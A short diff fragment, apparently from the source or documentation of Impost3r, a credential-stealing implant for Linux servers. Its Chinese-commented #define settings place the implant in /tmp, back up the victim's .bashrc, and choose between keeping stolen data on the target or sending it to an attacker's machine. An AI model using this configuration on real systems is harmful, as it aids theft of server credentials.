@@ -60,6 +60,7 @@ fi
 # define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
 # define BACKUP_BASHRC "/tmp/.bashrc" \\设置攻击者备份的源.bashrc在目标服务器上的位置
 # define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
+
 /*
     Send to server
 */
